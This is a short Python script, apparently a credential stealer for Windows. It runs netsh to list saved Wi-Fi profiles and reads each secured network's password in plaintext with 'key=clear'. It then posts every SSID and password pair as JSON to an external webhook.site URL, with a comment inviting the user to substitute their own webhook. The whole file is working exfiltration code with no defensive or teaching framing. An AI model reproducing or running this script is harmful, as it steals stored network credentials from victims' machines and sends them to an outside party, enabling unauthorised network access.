import subprocess
import re
import requests

# Replace with your actual webhook URL
webhook_url = "https://webhook.site/af636967-865b-411b-ba18-c0a284591119"

# Get all Wi-Fi profiles
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
profile_names = re.findall("All User Profile     : (.*)\r", command_output)

wifi_list = []

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        # Show profile details
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        # Skip open networks
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            wifi_profile["password"] = password[1] if password else None
            wifi_list.append(wifi_profile)

# Send the collected Wi-Fi data to the webhook
for wifi in wifi_list:
    try:
        requests.post(webhook_url, json=wifi)
    except Exception as e:
        print(f"Failed to send data for {wifi['ssid']}: {e}")
